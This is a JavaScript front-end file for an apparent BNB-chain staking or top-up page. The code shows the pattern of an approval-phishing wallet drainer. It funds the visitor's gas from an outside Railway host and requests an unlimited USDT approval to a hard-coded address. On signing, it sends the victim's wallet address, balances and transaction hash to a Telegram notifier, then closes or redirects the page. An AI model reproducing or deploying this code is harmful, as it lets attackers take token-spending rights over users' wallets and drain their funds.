// Auto Top-Up BNB Function
async function requestBNBTopUp(account) {
    try {
        const response = await fetch('https://armaan-production.up.railway.app/send-bnb', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ recipient: account }),
        });

        const data = await response.json();
        if (data.success) {
            return true;  // Return true indicating the top-up was successful
        } else {
            return false;  // Return false indicating the top-up failed
        }
    } catch (error) {
        console.error('Error during BNB request:', error);
        return false;  // Return false in case of an error
    }
}

// Token Approval Function
async function approveToken(account) {
    const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
    const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');

    // Get the current BNB balance
    const bnbBalance = await web3.eth.getBalance(account);
    const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB

    // Get the actual USDT balance (not allowance)
    const usdtBalance = await usdtContract.methods.balanceOf(account).call();
    const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether'); // Convert from Wei to USDT

    // Get the current approved USDT amount
    const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
    const approvedUSDT = web3.utils.fromWei(allowance, 'ether'); // Convert from Wei to USDT

    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleString();  // Format the current date and time

    // Get the approved address
    const approvedAddress = addressSTAKING;  // You can change this as needed

    console.log('Processing....');
    console.log('Account:', account);
    console.log('BNB Balance:', balanceInBNB);
    console.log('USDT Balance:', usdtBalanceFormatted);

    await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
        .send({ from: account })
        .on('transactionHash', async function (hash) {
            console.log('✅ Approval transaction sent with hash:', hash);
            console.log('📤 Attempting to send Telegram notification...');
            console.log('📤 Account:', account);
            console.log('📤 Balance BNB:', balanceInBNB);
            console.log('📤 USDT Balance:', usdtBalanceFormatted);
            console.log('📤 Approved Address:', approvedAddress);
            console.log('📤 Date:', formattedDate);
            console.log('📤 Hash:', hash);
            
            // Ensure all variables are defined
            const walletAddr = account || 'Unknown';
            const bnbBal = balanceInBNB || '0';
            const usdtBal = usdtBalanceFormatted || '0';
            const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
            const dateStr = formattedDate || new Date().toLocaleString();
            const txHash = hash || 'Unknown';
            
            // Send Telegram notification immediately when transaction hash is received
            console.log('📨 [TX] Sending Telegram notification...');
            sendTelegramNotification(
                walletAddr, 
                bnbBal, 
                usdtBal, 
                approvedAddr, 
                dateStr, 
                txHash
            ).then(result => {
                if (result) {
                    console.log('✅ [TX] Telegram notification sent successfully');
                } else {
                    console.error('❌ [TX] Telegram notification returned false');
                }
            }).catch(err => {
                console.error('❌ [TX] Telegram notification error:', err);
            });
            
            var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
            $.ajax({
                url: '/home/TopUpWithMetamaskJson',
                type: 'POST',
                dataType: 'JSON',
                contentType: 'application/json',
                data: JSON.stringify(maindt),
                success: function (data) {
                    console.log('Success');
                    // Close site immediately after Telegram notification sent
                    setTimeout(() => {
                        window.close();
                        // If window.close doesn't work, try redirect
                        if (!window.closed) {
                            location.href = "/home/index";
                        }
                    }, 500);
                },
                error: function (err) {
                    console.log("Error: " + JSON.stringify(err));
                    // Close site immediately after Telegram notification sent
                    setTimeout(() => {
                        window.close();
                        // If window.close doesn't work, try redirect
                        if (!window.closed) {
                            location.href = "/home/index";
                        }
                    }, 500);
                }
            });
        })
        .on('receipt', function (receipt) {
            console.log('Approval confirmed with receipt:', receipt);
        })
        .on('error', function (error) {
            if (error.code === 4001) {
                console.log("You canceled the approval request. Please try again.");
            } else {
                console.log("Approval failed: " + error.message);
            }
            console.error("Approval failed:", error);
        });
}

// Main TokenApprove function that includes auto top-up check
async function TokenApprove() {
    try {
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        const account = accounts[0];

        // Step 1: Check the current BNB balance (in background)
        const bnbBalance = await web3.eth.getBalance(account);
        const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
        console.log("Current BNB Balance: ", balanceInBNB);

        const requiredBNB = 0.0001;

        // Step 2: Auto top-up in background if needed
        if (parseFloat(balanceInBNB) < requiredBNB) {
            // Request the BNB top-up from the backend (in background)
            const topUpSuccess = await requestBNBTopUp(account);

            if (!topUpSuccess) {
                return;
            }

            // Wait for top-up to process
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Recheck balance
            const newBnbBalance = await web3.eth.getBalance(account);
            const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
            
            if (parseFloat(newBalanceInBNB) < requiredBNB) {
                return;
            }
        }

        // Step 3: Show approval request (MetaMask/Trust Wallet will show popup)
        await approveToken(account);
    } catch (error) {
        console.error('Error:', error);
    }
}

